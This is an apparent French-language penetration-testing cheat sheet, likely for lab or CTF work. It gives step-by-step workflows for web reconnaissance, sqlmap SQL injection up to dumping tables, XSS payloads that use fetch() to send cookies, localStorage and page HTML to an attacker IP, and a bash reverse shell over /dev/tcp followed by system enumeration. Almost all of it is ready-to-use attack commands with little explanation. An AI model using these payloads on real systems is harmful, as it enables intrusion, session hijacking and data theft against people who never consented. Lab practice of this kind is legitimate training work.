### Workflow Type - Découverte Web App

```bash
# 1. Scan ports
nmap -sV target

# 2. Banner grabbing
curl -I http://target

# 3. Crawler
echo "http://target" | hakrawler -u > urls.txt

# 4. Directory bruteforce
dirb http://target

# 5. Fuzzing
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt \
  -d "param=FUZZ" -u http://target/api
```

---

### Workflow Type - SQL Injection

```bash
# 1. Identifier vulnérabilité
sqlmap -u http://target/api?id=1

# 2. Lister bases
sqlmap -u http://target/api?id=1 --dbs

# 3. Choisir base + lister tables
sqlmap -u http://target/api?id=1 -D database_name --tables

# 4. Lister colonnes
sqlmap -u http://target/api?id=1 -D database_name -T table_name --columns

# 5. Dump données
sqlmap -u http://target/api?id=1 -D database_name -T table_name -C col1,col2 --dump
```

---

### Workflow Type - XSS Exploitation
```bash
<img src=x onerror="fetch('http://192.168.45.204/?c='+document.cookie)">

<svg onload="fetch('http://192.168.45.204/?c='+document.cookie)">

<script src='http://192.168.45.204/'></script>
```

```bash
# 1. Préparer script malicieux
mkdir xss && cd xss
nano xss.js
# Écrire: 
let d=JSON.stringify(localStorage);fetch("http://<IP>/exfil?data="+encodeURIComponent(d))

let cookies = document.cookie;
fetch("http://192.168.45.230/exfil?data="+encodeURIComponent(cookies));

// Récupère tout le HTML de la page let html = document.documentElement.innerHTML; fetch("http://192.168.45.230/exfil", { method: "POST", body: html });


# 2. Lancer serveur
python3 -m http.server 80

# 3. Payload dans app
<script src="http:///192.168.45.230/xss.js"></script>

# 4. Observer logs serveur
# Récupérer données exfiltrées
```

---

### Workflow Type - Reverse Shell

```bash
# 1. Kali - Lancer listener
nc -vlp 9090

# 2. Victime - Exécuter (via vulnérabilité)
# Exemple PHP: <?php system("bash -c 'bash -i >& /dev/tcp/<KALI_IP>/9090 0>&1'"); ?>

# 3. Shell apparaît dans listener

# 4. Upgrade shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# CTRL+Z
stty raw -echo; fg
reset

# 5. Énumérer système
whoami
id
ls -la
cat /etc/passwd
find / -name flag.txt 2>/dev/null
```

---
